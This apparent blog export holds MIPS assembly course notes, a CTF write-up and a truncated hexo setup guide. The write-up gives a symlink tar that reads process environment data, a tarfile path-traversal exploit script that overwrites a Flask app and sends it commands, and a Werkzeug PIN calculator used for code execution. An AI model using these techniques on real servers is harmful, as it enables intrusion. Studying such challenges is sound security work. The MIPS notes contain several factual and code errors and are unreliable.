$s1=Memory[$s2+20]即a=b[5]      | 括号外的字节数只能用常数，用于取数组值 |\n| 存字                                       | sw $s1,20($s2)    | Memory[$s2+20]=$s1即b[5]=a      | 用于对数组赋值                         |\n| 取半字                                     | lh $s1,20($s2)    | $s1=Memory[$s2+20]              | 取字是该地址后四个字节，半字则两个字节 |\n| 取无符号半字                               | lhu $s1,20($s2)   | $s1=Memory[$s2+20]              | 顾名思义，无符号                       |\n| 存半字                                     | sh $s1,20($s2)    | Memory[$s2+20]=$s1              |                                        |\n| 取字节                                     | lb $s1,20($s2)    | $s1=Memory[$s2+20]              | 取一个字节                             |\n| 取无符号字节                               | lbu $s1,20($s2)   | $s1=Memory[$s2+20]              |                                        |\n| 存字节                                     | sb $s1,20($s2)    | Memory[$s2+20]=$s1              |                                        |\n| *取链接字*                                 | *ll $s1,20($s2)*  | *$s1=Memory[$s2+20]*            |                                        |\n| *存条件字*                                 | *sc $s1,20($s2)*  | *Memory[$s2+20]=$s1;$s1=o or 1* |                                        |\n| *取立即数的高位*                           | *lui $s1,20*      | *$s1=20*2^16*                   |                                        |\n| 与                                         | and $s1,$s2,$s3   | $s1=$s2 & $s3                   | 按位与                                 |\n| 或                                         | or $s1,$s2,$s3    | $s1=$s2 \\| $s3                  | 按位或                                 |\n| 或非                                       | nor $s1,$s2,$s3   | $s1=~($s2 \\| $s3)               | 按位或非                               |\n| 异或                                       | xor $s1,$s2,$s3   | 异或                            | 异或                                   |\n| 立即数与                                   | andi $s1,$s2,20   | $s1=$s2 & 20                    |                                        |\n| 立即数或                                   | ori $s1,$s2,20    | $s1=$s2 \\| 20                   |                                        |\n| 逻辑左移                                   | sll $s1,$s2,10    | $s1=$s2<<10                     | 左移n位等同于乘2^n                     |\n| 逻辑右移                                   | srl $s1,$s2,10    | $s1=$s2>>10                     | 除2^n                                  |\n| 相等时跳转                                 | beq $s1,$s1,Else  | if($s1==$s2) go to Else         | Else一般是后面定义的一个标签           |\n| 不相等时跳转                               | bne $s1,$s1,Else  | if($s1!=$s2) go to Else         |                                        |\n| 小于时置位                                 | slt $s1,$s2,$s3   | if($s2<$s3) $s1=1;else $s1=0    | 前小于后则赋1                          |\n| **无符号数**比较小于时置位                 | sltu $s1,$s2,$s3  | if($s2<$s3) $s1=1;else $s1=0    | 无符号数                               |\n| **无符号数**比较小于**立即数**时置位       | slti $s1,$s2,$s3  | if($s2<20) $s1=1;else $s1=0     | 比较是否小于常数                       |\n| **无符号数**比较小于**无符号立即数**时置位 | sltiu $s1,$s2,$s3 | if($s2<20) $s1=1;else $s1=0     | 比较是否小于无符号常数                 |\n| 跳转                                       | j 2500            | go to 10000                     | 当然标签也可以                         |\n| 跳转至寄存器所指位置                       | jr $ra            | go to $ra                       | 用于switch以及过程调用                 |\n| 跳转并且链接                               | jal 2500          | $ra=PC+4;go to 10000            | 用于过程调用                           |\n\n## 32位寄存器\n\n| 表示    | 作用                         | 注释                                            | 位置       |\n| ------- | ---------------------------- | ----------------------------------------------- | ---------- |\n| $zero   | 寄存器的值恒为0              |                                                 | 1          |\n| $v0~$v1 | 计算结果，返回值             | 用于返回值                                      | 2~3        |\n| $a0~$a3 | 用于进入函数时传递参数       |                                                 | 4~7        |\n| $s0~$s7 | 保留寄存器                   | 一般存一些重要的值                              | 16~23      |\n| $t0~$t9 | 临时寄存器                   | 其它函数或循环等中的临时变量                    | 8~15,24~25 |\n| $at     | 汇编器保留，用于处理大的常数 |                                                 |            |\n| $sp     | 栈指针                       | 进入其它函数时                                  | 29         |\n| $ra     | 返回指针                     | 用于返回起始点的返回地址寄存器                  | 31         |\n| $gp     | 全局指针                     | 指向静态数据区的保留寄存器,全局变量或static变量 |            |\n| $fp     | 帧指针                       |                                                 |            |\n| $k0~$k1 |                              |                                                 |            |\n\n## 机器指令\n\n### R型\n\nop与funct为**六位**，其他**五位**，加起来正好**三十二位**\n\n| 例                | op(操作码) | rs(操作数寄存器) | rt(操作数寄存器) | rd(目的寄存器) | shamt(位移量) | funct(功能码) |\n| ----------------- | ---------- | ---------------- | ---------------- | -------------- | ------------- | ------------- |\n| add $t0, $s1, $s2 | 0          | 17(**$s1**)      | 18(**$s2**)      | 8(**$t0**)     | 0             | 32            |\n| sub               | 0          | reg              | reg              | reg            | 0             | 34            |\n\n### I型\n\n因rd寄存器只有五位(**<32**)，限制太大，故设计**I型**\n\nconstant or address包含rd,shamt,funct，所以十六位\n\n**rt变为目的寄存器**\n\n| 例              | op   | rs   | rt   | constant or address |\n| --------------- | ---- | ---- | ---- | ------------------- |\n| addi            | 8    | reg  | reg  | **address**         |\n| lw              | 35   | reg  | reg  | **address**         |\n| sw              | 43   | reg  | reg  | **address**         |\n| lw $t0,300($t1) | 35   | 9    | 8    | 1200(**300 * 4**)   |\n\n**address**表示十六位地址\n\n## 逻辑操作\n\n### 移位(>><<)\n\n逻辑左移 (sll)：将一个字里面的所有位都向左移动，并在空出来的位上填充 0。\n\n逻辑右移 (srl)：将一个字里面的所有位都向左移动，并在空出来的位上填充 0。\n\n左移 𝑖 位就相当于乘以 2^𝑖，右移即除\n\n### 按位与(AND)\n\nAND 提供了一种将源操作数中某些位置为0 的能力，前提是另一个操作数中对应位为0。后一个操作数传统上被称为掩码(mask) ，寓意其可\"隐藏\"某些位。\n\n上下都为 **1** 则结果为 **1**\n\n### 按位或(OR)\n\n上下任意一数为 **1** 则结果为 **1**\n\n### 按位取反(NOT)\n\n对一个数进行操作，1变成0，0变成1\n\n### 或非(NOT OR)\n\n顾名思义，先**或**再**取反**\n\n### 异或(XOR)\n\n相同置1，不相同置0\n\n## 示例\n\n### 叶过程\n\n> C 程序\n>\n> ```c\n> int leaf_example (int g, int h, int i, int j)\n> {\n> \tint f;\n> \tf = (g + h) - (i + j);\n> \treturn f;\n> }\n> ```\n>\n> 编译后的MIPS 汇编代码是什么呢?\n>\n> 参数变量 g 、h 、i 和 j 对应参数寄存器 $a0 、$a1 、$a2 和$a3，f 对应 $s0\n> 假定需要保留$s0,$t0和$t1这三个寄存器\n\n>  **解**\n>\n> ```gas\n> leaf_example:\t#子程序名，标号\n>     addi $sp,$sp,-12\t#将栈指针$sp向低地址压3个字用于保留原寄存器的值\n>     sw $t1, 8($sp)\n>     sw $t0, 4($sp)\n>     sw $s0, 0($sp)\t#保存原值\n>     add $t0, $a0, $a1\t# register $t0 contains g+h\n>     add $t1, $a2, $a3\t# register $t1 contains i+j\n>     sub $s0, $t0, $t1 # f = (g + h) - (i + j)\n>     add $v0, $t0, $t1\t# 将f的值存进返回值寄存器$v0用于返回值\n>     lw $s0, 0($sp)\n>     lw $t0, 4($sp)\n>     lw $t1, 8($sp)\t#恢复原值\n>     addi $sp, $sp, 12\t#恢复栈指针原来的位置\n>     jr $ra\t#根据跳转寄存器中的返回地址跳转\n> ```\n>\n> 栈的作用图\n>\n> <img src=\"image-20221216203055223.png\">\n\n这个过程可叫做**叶过程**，即不调用其他过程的过程\n\n一般来说\n\n| 保留           | 不保留         |\n| -------------- | -------------- |\n| $s0~$s7        | $t0~$t9        |\n| $sp            | $a0~$a3        |\n| $ra            | $v0~$v1        |\n| 栈指针以上的栈 | 栈指针以下的栈 |\n\n### 非叶过程\n\n如果是非叶过程，即调用该过程的中途也要调用其他过程，可能会导致寄存器使用冲突\n\n解决方法就是**将所有必须保留的寄存器压栈**\n\n* **调用者**将所有调用后还需要的参数寄存器 ($a0 - $a3) 或临时寄存器 ($t0 - $t9) 压栈\n* **被调用者**将返回地址寄存器$ra和被调用者使用的保留寄存器( $s0 - $s7) 都压栈\n* **栈指针$sp**随着栈中寄存器个数调整。到返回时，寄存器会从存储器中恢复，栈指针也随着重新调整。\n\n#### **递归过程**\n\n重复调用函数\n\n> 下面是一个计算阶乘的递归过程:\n>\n> ```c\n> int fact (int n) {\n> \tif(n<1) \n>         return(1);\n> \telse \n>         return ( n * fact(n -1));\n> }\n> ```\n>\n> 该过程的MIPS 汇编代码是怎样的呢?\n\n> **解**\n>\n> ```gas\n> fact:\n> \taddi $sp, $sp, -8\t\n> \tsw $ra, 4($sp)\t#根据上述叶过程需保留 $ra\n> \tsw $a0, 0($sp)\t#同样，参数寄存器 $a0(<==>n) 也需要保留\n> \tslti $t0, $a0, 1\t# $a0 < 1 时 $t0 置 1\n> \tbeq $t0, $zero, L1\t# if $t0 == 0, go to L1, else(即$t0 == 1) 则继续\n> \taddi $v0, $zero, 1\t#retutn 1\n> \taddi $sp, $sp, 8\t#并未进入其他过程，所以直接弹栈返回即可\n> \tjr $ra\t#return\n> \tL1:\n> \t\taddi $a0, $a0, -1 # gets n - 1\n> \t\tjal fact\t# call fact with (n - 1)\n> \tlw $a0, 0($sp)\t#接下来的部分属于 fact\n> \tlw $ra, 4($sp)\n> \taddi $sp, $sp, 8\t#嵌套了其他过程，所以其他过程进行完后要恢复原值\n> \tmul $v0, $a0, $v0\t#将上一过程的返回值乘 n 来得到现在过程的返回值\n> \tjr $ra\t#return\n> ```\n>\n> \n\n#### **迭代过程**\n\n**循环某一过程**而非循环进入函数\n\n> 考虑下面一个用来求和的过程:\n>\n> ```c\n> int sum (int n, int acc) {\n> \tif (n>0)\n> \t\treturn sum (n – 1, acc + n) ;\n> \telse\n> \t\treturn acc;\n> }\n> ```\n>\n> 该过程的MIPS 汇编代码是怎样的呢?\n\n> **解**\n>\n> 分析一下可知，如果 **n>0** 则令 **n-1** 并且使 **acc+n**\n>\n> 完完全全可以用循环代替\n>\n> **假设 $a0 = n  $a1 = acc**\n>\n> ```gas\n> sum:\n> \tslit $t0, $a0, 1\t# $a0 < 1 时 $t0 置 1\n> \tbne $t0, $zero, sum_exit\t# if $t0 == 0 , go to sum_exit\n> \tadd $a1, $a1, $a0\t# acc = acc + n\n> \taddi $a0, $a0, -1\t# go to sum\n> sum_exit:\n> \tadd $v0, $a1, $zero\t#return acc\n> \tjr $ra\t#return\n> ```\n>\n> \n\n### 字符操作\n\n一个 **char** 一字节，八比特，最高表示 **127**，即**ASCII**码的127位\n\n所以对字符串的操作一般是 **lb(字节读取) sb(字节存储)**\n\n> C语言\n>\n> ```c\n> void strcpy (char x[], char y[]) {\n>     int i;\n>     i = 0;\n>     while ((x[i] = y[i]) != '\\0')\n>         i += 1;\n> }\n> ```\n>\n> 编译后的MIPS汇编代码是什么？\n\n> **解**\n>\n> 假定数组 x 和 y 的基地址在 $a0 和 $a1 中，而 i 在 $s0 中\n>\n> strcpy 调整栈指针然后将保存的寄存器 $s0 保存在栈中\n>\n> ```gas\n> strcpy:\n> \taddi $sp, $sp, -4\n> \tsw $s0, 0($sp)\n> \tadd $s0, $zero, $zero\t# 初始化 i\n> \tL1:\n> \t\tadd $t1, $s0, $a1\t# get address y[i]\n> \t\tlbu $t2, 0($t1)\t# $t2 = y[i] 得到第 i 个字符\n> \t\tadd $t3, $s0, $a0\t# get address x[i]\n> \t\tsb $t2, 0($t3)\t# x[i] = y[i]\n> \t\tbeq $t2, $zero, L2 # if y[i] == 0 , go to L2\n> \t\taddi $s0, $s0, 1\t# i = i + 1\n> \t\tj L1\t# 不是则继续循环 L1\n> \tL2:\n> \t\tlw $s0, 0($sp)\n> \t\taddi $sp, $sp, 4\n> \t\tjr $ra\t#return\n> ```\n>\n> \n\n\n\n## 注意\n\n* 一个字四个字节，一个字节八比特\n* 负数一般用补码表示(**取反后 +1**)\n* 无符号数即把符号位也当成一位数，如-1的无符号数为为**4294967295**\n* 如果参数多于参数寄存器的数量(**4**)，**MIPS**约定将额外参数放在**栈指针的上方**\n\n### 利用无符号数进行边界检查\n\n可降低检验下标是否越界的开销\n\n```gas\nsltu $t0, $s1, $t2\t# $t0=0 if $s1 >= $t2 or $s1 <0\nbeq $t0, $zero, IndexOutOfBounds\t#if bad , goto Error\n```\n\n# 第三章\n\n## 加减法\n\n### 溢出\n\n由于字宽只有32位，所以在运算中会发生溢出\n\n```php\n\t0100 0000 0000 0000 0000 0000 0000 0111\n+\t0100 0000 0000 0000 0000 0000 0000 0110\n————————————————————————————————————————————\n=\t1000 0000 0000 0000 0000 0000 0000 1101\n```\n\n溢出会导致异常\n\n**同号的数相减，不会溢出**\n\n**异号的数相加，不会溢出**\n\n对无符号数处理的算术指令，不会产生异常(**addu,addiu,subu...**)\n\n### 溢出的判断\n\n**有符号加法**\n\n若输入的两数据符号位相同，而输出的数据符号位与前数据不同，则鉴定为溢出，抛出异常\n\n其他同理\n\n## 乘法\n\n十进制下 **1000 × 1001**\n\n```php\n\t\t\t1000\n×\t\t\t1001\n————————————————————\n\t\t\t1000\n\t\t   0000\n\t\t  0000\n\t\t 1000\n————————————————————\n\t\t 1001000\n```\n\n<img src=\"image-20221217162459269.png\">\n\n看不太懂这个图，反正就那意思😣\n\n## 除法\n\n<img src=\"image-20221217163016072.png\">\n\n两者对于符号位的处理都是，**同号为正，异号为负**\n\n## 浮点数\n\n**单精度浮点数**：**指数域**8位，**尾数域**2位，**符号**1位。\n\n# 计组大作业\n\n## 第一题\n\n> 将下面的C代码翻译为MIPS汇编代码。要求使用的指令数目最少。假设值a、b、i和j分别存放在寄存器$s0、$s1、$t0和$t1中。另外假设寄存器$s2中存放着数组D的基地址\n>\n> ```c\n> for (i =0 ; i < a; i++) {\n> \tfor (j = 0; j < b; j++) {\n> \t\tD[4*j] = i + j;\n> \t}\n> }\n> ```\n>\n> \n\n\n\n> **解**\n>\n> 设定a=10,b=10,完成数组D[]的更新，并输出数组信息；\n>\n> ```gas\n> # Author: 肖磊\n> # Date: 2022-12-17\n> .data\n> \n> array_D: .space 160\n> updateMsg: .asciiz \"update:\"\n> line: .asciiz \"\\n\"\n> space: .asciiz \" \"\n> \n> .text\n> main:\n> \t# save a, b, D[]\n> \taddi $sp, $sp, -12\n> \tsw $s0, 8($sp)\n> \tsw $s1, 4($sp)\n> \tsw $s2, 0($sp)\n> \n> \t#initialization\n> \taddi $s0, $zero, 10\t# a = 10\n> \taddi $s1, $zero, 10\t# b = 10\n> \tla $s2, array_D\t# D with 160 space\n> \tli $t0, 0\t# int i = 0\n> \n> \tfirst_loop:\n> \t\t# if i < a\n> \t\tbge $t0, $s0, loop1_exit\t# bge if $t0 ≥ $s0 , j loop1_exit\n> \t\tli $t1, 0\t# int j = 0\n> \t\tsecond_loop:\n> \t\t\t# if j < b\n> \t\t\tbge $t1, $s1, loop2_exit\n> \t\t\tadd $t2, $t0, $t1\t# i + j\n> \t\t\tsll $t3, $t1, 4\t# t3 = 4 * 4 * j\n> \t\t\tadd $t3, $t3, $s2\t# address of D[4 * j]\n> \t\t\tsw $t2, 0($t3)\t# D[4 * j] = i + j\n> \t\t\taddi $t1, $t1, 1\t# j++\n> \t\t\tj second_loop\n> \t\tloop2_exit:\n> \t\t\t# print updateMsg\n> \t\t\tli $v0, 4\n> \t\t\tla $a0, updateMsg\n> \t\t\tsyscall\n> \t\t\t# print array\n> \t\t\tjal print_array\n> \t\t\taddi $t0, $t0, 1\t# i++\n> \t\t\tj first_loop\n> \tloop1_exit:\n> \t\tlw $s2, 8($sp)\n> \t\tlw $s1, 4($sp)\n> \t\tlw $s0, 0($sp)\n> \t\taddi $sp, $sp, 12\n> \t\tli $v0, 10\n> \t\tsyscall\n> \n> print_array:\n> \tmove $t2, $s2\t# $t2 = D[]\n> \tli $t1, 0\t# $t1 = k\n> \tprint_loop:\n> \t\tli $t3, 40\n> \t\tbge $t1, $t3, loop_done\t# if k ≥ 40, done\n> \t\t# array\n> \t\tli $v0, 1\n> \t\tlw $t4, 0($t2)\n> \t\tmove $a0, $t4\n> \t\tsyscall\n> \t\t# space\n> \t\tli $v0, 4\n> \t\tla $a0, space\n> \t\tsyscall\n> \t\t# next loop\n> \t\taddi $t2, $t2, 4\n> \t\taddi $t1, $t1, 1\n> \t\tj print_loop\n> \tloop_done:\n> \t\t# next line\n> \t\tli $v0, 4\n> \t\tla $a0, line\n> \t\tsyscall\n> \t\tjr $ra\n> ```\n>\n> 经测试无误\n>\n> <img src=\"image-20221218144728404.png\">\n\n## 第二题\n\n> 完成斐奇那波数列 **F[n] = F[n-1] + F[n-2]**，设定任意的n值，并实现数列输出\n>\n> 考虑到数列只需要输出而无需保存，写出C代码\n>\n> ```c\n> int t0 = 0;\n> int t1 = 1;\n> int i = 0;\n> while (i < n) {\n> \tprintf(\"%d\",t0);\n> \tint t2 = t0 + t1;\n> \tt0 = t1;\n> \tt1 = t2;\n> \ti ++;\n> }\n> ```\n>\n> 由以上C代码写出汇编代码\n\n\n\n> **解**\n>\n> ```gas\n> #Author: 肖磊\n> #Date: 2022-12-18\n> \n> .data\n> input_msg: .asciiz \"Please input n: \"\n> output_msg: .asciiz \"Fibonacci sequence: \"\n> space: .asciiz \" \"\n> \n> .text\n> main:\n> \t# save $s0\n> \taddi $sp, $sp, -4\n> \tsw $s0, 0($sp)\n> \t\n>     # \"Please input n: \"\n>     li $v0, 4\n>     la $a0, input_msg\n>     syscall\n>     # get n\n>     li $v0, 5\n>     syscall\n>     move $s0, $v0\n>     \n>     # \"Fibonacci sequence: \"\n>     li $v0, 4\n>     la $a0, output_msg\n>     syscall\n> \n>     # Fibonacci\n>     li $t0, 0\n>     li $t1, 1\n>     li $t3, 0   # i = 0\n>     loop:\n>         bge $t3, $s0, done  # if i ≥ n, go done\n>         # print t0\n>         li $v0, 1\n>         move $a0, $t0\n>         syscall\n>         # print space\n>         li $v0, 4\n>         la $a0, space\n>         syscall\n>         add $t2, $t0, $t1   # int t2 = t0 + t1\n>         move $t0, $t1   # t0 = t1\n>         move $t1, $t2   # t1 = t2\n>         addi $t3, $t3, 1    # i ++\n>         j loop\n>     done:\n>     \taddi, $sp, $sp, 4\n>     \tlw $s0, 0($sp)\n>         li $v0, 10\n>         syscall\n> ```\n>\n> 经测试无误\n>\n> <img src=\"image-20221218144632739.png\">\n\n## 第三题\n\n> 输入n个数据，并采用**冒泡排序**，然后输出显示。\n>\n> C代码\n>\n> ```C\n> for (int i =0; i < n - 1; i ++) {\n> \tfor (int j = 0; j < n - i - 1; j++){\n> \t\tif (arr[j] > arr[j + 1]) {\n> \t\t\tint temp = arr[j];\n> \t\t\tarr[j] = arr[j + 1];\n> \t\t\tarr[j + 1] = temp;\n> \t\t}\n> \t}\n> }\n> ```\n>\n> 由以上C代码写出汇编代码\n\n\n\n> **解**\n>\n> ```gas\n> # Author: 肖磊\n> # Date: 2022-12-18\n> \n> .data\n> array: .space 100\n> space: .asciiz \" \"\n> line: .asciiz \"\\n\"\n> input_msg: .asciiz \"Please input the size of array(0 ~ 25) : \"\n> array_msg: .asciiz \"Please input the array: \"\n> error_msg: .asciiz \"Error: Invalid number\"\n> before_msg: .asciiz \"Array before sorting: \"\n> after_msg: .asciiz \"Array after sorting: \"\n> \n> .text\n> main:\n>     addi $sp, $sp, -8\n>     sw $s0, 0($sp)\n>     sw $s1, 4($sp)\n>     # \"Please input the size of array(0~25): \"\n>     li $v0, 4\n>     la $a0, input_msg\n>     syscall\n>         \n>     # get n\n>     li $v0, 5\n>     syscall\n>     move $s0, $v0\n>         \n>     # check if error\n>     li $t0, 25\n>     bgt $s0, $t0, error\n>     ble $s0, $zero, error\n>         \n>     # get array\n>     # \"Please input the array: \"\n>     li $v0, 4\n>     la $a0, array_msg\n>     syscall\n>     # new line\n>     li $v0, 4\n> \tla $a0, line\n> \tsyscall\n> \tla $s1, array   # Init array\n> \tmove $t0, $s1\n> \tli $t1, 0   # int i = 0\n>         \n> \tinput_loop:\n> \t\tbge $t1, $s0, input_done    # if i ≥ n, go done\n> \t\tli $v0, 5\n> \t\tsyscall\n> \t\tsw $v0, 0($t0)\n> \t\taddi $t0, $t0, 4\n> \t\taddi $t1, $t1, 1\n> \t\tj input_loop\n>         \n> \tinput_done:\n> \t\t# \"Array before sorting: \"\n> \t\tli $v0, 4\n> \t\tla $a0, before_msg\n> \t\tsyscall\n> \t\tjal print_array\n> \n> \n> # Bubble sort\n> \tli $t1, 0   # int i = 0\n> \tfirst_loop:\n> \t\tbge $t1, $s0, loop1_done    # if i ≥ n , go done\n> \t\tli $t2, 0   # int j = 0\n> \t\tmove $t0, $s1\n> \t\t\n> \t\tsecond_loop:\n> \t\t\taddi $t3, $s0, -1   # get size - 1\n> \t\t\tsub $t3, $t3, $t1   # get size - i - 1\n> \t\t\tbge $t2, $t3, loop2_done\n> \t\t\tlw $t3, 0($t0)  # $t3 = arr[j]\n> \t\t\tlw $t4, 4($t0)  # $t4 = arr[j + 1]\n> \t\t\t# if arr[j] > arr[j + 1], swap\n> \t\t\t# else, do nothing\n> \t\t\tble $t3, $t4, swap_done\n> \t\t\tsw $t3, 4($t0)\n> \t\t\tsw $t4, 0($t0)\n> \t\t\tswap_done:\n> \t\t\taddi $t2, $t2, 1    # j ++\n> \t\t\taddi $t0, $t0, 4    # next\n> \t\t\tj second_loop\n>                 \n> \t\tloop2_done:\n> \t\t\taddi $t1, $t1, 1    # i ++\n> \t\t\tj first_loop\n>                 \n> \tloop1_done:\n> \t\t# line\n> \t\tli $v0, 4\n> \t\tla $a0, line\n> \t\tsyscall\n> \t\t# \"Array after sorting: \"\n> \t\tli $v0, 4\n> \t\tla $a0, after_msg\n> \t\tsyscall\n> \t\tjal print_array\n>                 \n>         \n> exit:\n>     lw $s0, 0($sp)\n>     lw $s1, 4($sp)\n>     addi $sp, $sp, 8\n>     li $v0, 10\n>     syscall\n>         \n> print_array:\n>     move $t0, $s1\n>     li $t1, 0   # int i = 0\n>     print_loop:\n>         bge $t1, $s0, print_done\n>         lw $t2, 0($t0)\n>         # print number\n>         li $v0, 1\n>         move $a0, $t2\n>         syscall\n>         # print space\n>         li $v0, 4\n>         la $a0, space\n>         syscall\n>         # next\n>         addi $t0, $t0, 4\n>         addi $t1, $t1, 1    # i++\n>         j print_loop\n>     print_done:\n>         jr $ra\n> \n> error:\n>     # \"Error: Invalid number\"\n>     li $v0, 4\n>     la $a0, error_msg\n>     syscall\n>     j exit\n> ```\n>\n> 经测试无误\n>\n> <img src=\"image-20221218163911491.png\">\n","tags":["class","cs"]},{"title":"。","url":"/2022/11/27/。/","content":"# <center>见证历史</center>"},{"title":"NSS-6","url":"/2022/11/26/NSS-6/","content":"\n## web\n\n### check(V1)&&check(V2)\n\n```python\n# -*- coding: utf-8 -*-\nfrom flask import Flask,request\nimport tarfile\nimport os\n\napp = Flask(__name__)\napp.config['UPLOAD_FOLDER'] = './uploads'\napp.config['MAX_CONTENT_LENGTH'] = 100 * 1024\nALLOWED_EXTENSIONS = set(['tar'])\n\ndef allowed_file(filename):\n    return '.' in filename and \\\n        filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS\n\n@app.route('/')\ndef index():\n    with open(__file__, 'r') as f:\n        return f.read()\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return '?'\n    file = request.files['file']\n    if file.filename == '':\n        return '?'\n    print(file.filename)\n    if file and allowed_file(file.filename) and '..' not in file.filename and '/' not in file.filename:\n        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)\n        if(os.path.exists(file_save_path)):\n            return 'This file already exists'\n        file.save(file_save_path)\n    else:\n        return 'This file is not a tarfile'\n    try:\n        tar = tarfile.open(file_save_path, \"r\")\n        tar.extractall(app.config['UPLOAD_FOLDER'])\n    except Exception as e:\n        return str(e)\n    os.remove(file_save_path)\n    return 'success'\n\n@app.route('/download', methods=['POST'])\ndef download_file():\n    filename = request.form.get('filename')\n    if filename is None or filename == '':\n        return '?'\n    \n    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)\n    \n    if '..' in filename or '/' in filename:\n        return '?'\n    \n    if not os.path.exists(filepath) or not os.path.isfile(filepath):\n        return '?'\n    \n    with open(filepath, 'r') as f:\n        return f.read()\n    \n@app.route('/clean', methods=['POST'])\ndef clean_file():\n    os.system('/tmp/clean.sh')\n    return 'success'\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', debug=True, port=80)\n```\n\n对软链接没有任何限制，直接非预期了\n\n想着flask算pin，先看了下env\n\n```shell\nln -s /proc/self/environ 1\ntar -zcvf 1.tar 1     #-z 用于压缩软连接\nPOST上传\n```\n<img src=\"image-20221016221716692.png\">\n\n访问得到flag\n\n### check(Revenge)\n\n侥幸非预期拿了个一血😋\n\n```python\n# -*- coding: utf-8 -*-\nfrom flask import Flask,request\nimport tarfile\nimport os\n\napp = Flask(__name__)\napp.config['UPLOAD_FOLDER'] = './uploads'\napp.config['MAX_CONTENT_LENGTH'] = 100 * 1024\nALLOWED_EXTENSIONS = set(['tar'])\n\ndef allowed_file(filename):\n    return '.' in filename and \\\n        filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS\n\n@app.route('/')\ndef index():\n    with open(__file__, 'r') as f:\n        return f.read()\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return '?'\n    file = request.files['file']\n    if file.filename == '':\n        return '?'\n\n    if file and allowed_file(file.filename) and '..' not in file.filename and '/' not in file.filename:\n        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)\n        if(os.path.exists(file_save_path)):\n            return 'This file already exists'\n        file.save(file_save_path)\n    else:\n        return 'This file is not a tarfile'\n    try:\n        tar = tarfile.open(file_save_path, \"r\")\n        tar.extractall(app.config['UPLOAD_FOLDER'])\n    except Exception as e:\n        return str(e)\n    os.remove(file_save_path)\n    return 'success'\n\n@app.route('/download', methods=['POST'])\ndef download_file():\n    filename = request.form.get('filename')\n    if filename is None or filename == '':\n        return '?'\n    \n    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)\n    \n    if '..' in filename or '/' in filename:\n        return '?'\n    \n    if not os.path.exists(filepath) or not os.path.isfile(filepath):\n        return '?'\n    \n    if os.path.islink(filepath):\n        return '?'\n    \n    if oct(os.stat(filepath).st_mode)[-3:] != '444':\n        return '?'\n    \n    with open(filepath, 'r') as f:\n        return f.read()\n    \n@app.route('/clean', methods=['POST'])\ndef clean_file():\n    os.system('su ctf -c /tmp/clean.sh')\n    return 'success'\n\n# print(os.environ)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', debug=True, port=80)\n```\n\n`os.path.islink`对软链接进行了限制，没找到可绕过的办法(开始异想天开想着构造双层tar来看文件，直接报错嘞，正好看到文件名**main.py**，**python 3.10**)\n\n但是可以利用[**CVE-2007-4559**](https://www.trellix.com/en-us/about/newsroom/stories/research/tarfile-exploiting-the-world.html)通过文件名中包含`../`来覆盖远程服务器上的任何文件\n\n#### 非预期\n\n因为**flask**在debug模式开启后会**auto_reload**，所以可利用此特性，覆盖**main.py**\n\n在原来的基础上加个这个\n<img src=\"image-20221016223327232.png\">\n\n**exp**\n\n```python\nimport tarfile\nimport requests\n\ndef change_name(tarinfo):\n    tarinfo.name = \"../\" + tarinfo.name\n    return tarinfo\n\nwith tarfile.open(\"exploit.tar\", \"w:xz\") as tar:\n    tar.add(\"main.py\", filter=change_name)\n    \ndef upload():\n    res = requests.post(url=url, files={\"file\": open(\"exploit.tar\", 'rb')})\n    \nurl='http://1.14.71.254:28045/upload'\nupload()\nwhile 1:\n    a=input('bash:')\n    r=requests.post(url=url+'?a='+a)\n    print(r.text)\n```\n<img src=\"image-20221016224003715.png\">\n\n#### 预期\n\n预期是利用覆盖`/tmp/clean.sh`，然后访问`/clean` getshell\n\n然后你会发现flag是root权限才能读的\n\n所以就只能**flask算pin**来得到root权限了\n\n常用反弹shell的命令都没弹成功，不知道怎么回事，直接root权限读文件吧\n\n用户为肯定为**root**了\n\n**app.py**的位置上面已得到\n<img src=\"image-20221016233634606.png\">\n\n算pin(**详见上篇文章**)\n\n```python\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    'root'# username\n    'flask.app',# modname\n    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))\n    '/usr/local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),\n]\n\nprivate_bits = [\n    '2485376925239',# str(uuid.getnode()),  /sys/class/net/ens33/address\n    '96cec10d3d9307792745ec3b85c8962079be847c1c22f74bae99e457863e13fd4c60de47472f2a8d533525466d7c34de'# get_machine_id(), /etc/machine-id\n]\n\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n            continue\n    if isinstance(bit, str):\n        bit = bit.encode(\"utf-8\")\n    h.update(bit)\nh.update(b\"cookiesalt\")\n\ncookie_name = f\"__wzd{h.hexdigest()[:20]}\"\n\nnum = None\nif num is None:\n    h.update(b\"pinsalt\")\n    num = f\"{int(h.hexdigest(), 16):09d}\"[:9]\n\nrv=None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = \"-\".join(\n                num[x : x + group_size].rjust(group_size, \"0\")\n                for x in range(0, len(num), group_size)\n            )\n            break\n    else:\n        rv = num\n\nprint(rv)\n```\n\n**rce**\n\n<img src=\"image-20221016233908068.png\">\n\n","tags":["web"]},{"title":"hexo部署在Github Pages","url":"/2022/11/26/hexo部署在Github Pages/","content":"\n记录下用hexo搭建Github Pages的过程\n\n## 前言\n\n之前一直都想在服务器上搭建一个**hexo**博客，但对**node.js**完全不熟悉以及在宝塔面板上部署静态博客好像有点麻烦，就简单的用**typecho**，随便找了一个主题搭建了[博客](https://xlccccc.cn/)。\n\n**typecho**是适配markdown的，就是每个图片都要上传附件然后更改图片路径导致我自己写的md完全没有发上去的欲望\n\n而**git+hexo**就很方便了，写完直接`git push`就好了，组会也正好有这个任务，就借此机会完成了。(~~不能再拖了~~)\n\n## 环境\n\nUbuntu 22.04\n\n## node.js and npm\n\nNode的环境配置比较简单\n\n```bash\n$ sudo apt install nodejs npm\n$ node -v\nv12.22.9\n$ npm 